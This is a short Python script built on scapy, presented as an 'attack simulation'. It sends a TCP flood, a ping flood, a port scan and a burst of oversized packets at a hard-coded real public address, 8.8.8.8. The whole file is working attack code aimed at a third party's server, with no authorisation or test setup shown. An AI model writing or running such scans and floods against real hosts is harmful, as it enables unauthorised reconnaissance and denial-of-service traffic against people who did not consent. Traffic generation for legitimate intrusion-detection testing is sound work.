from scapy.all import IP,TCP,ICMP,send
import random
import time

target_ip="8.8.8.8"

print("starting attack simulation")
def packet_flood():
    print("running packet flood attack...")
    for i in range(100):
         packet=IP(dst=target_ip)/TCP()
         send(packet, verbose=False)

def ping_flood():
    print("Running ping flood attack...")
    for i in range(100):
        packet = IP(dst=target_ip)/ICMP()
        send(packet, verbose=False)
def port_scan():
    print("Running port scan simulation...")
    for port in range(20,120):
        packet = IP(dst=target_ip)/TCP(dport=port)
        send(packet, verbose=False)

def large_packet_attack():
    print("Running large packet attack...")
    for i in range(50):
        payload = "X"*random.randint(1000,5000)
        packet = IP(dst=target_ip)/TCP()/payload
        send(packet, verbose=False)
packet_flood()
time.sleep(2)

ping_flood()
time.sleep(2)

port_scan()
time.sleep(2)

large_packet_attack()
print("attack simualtion finished")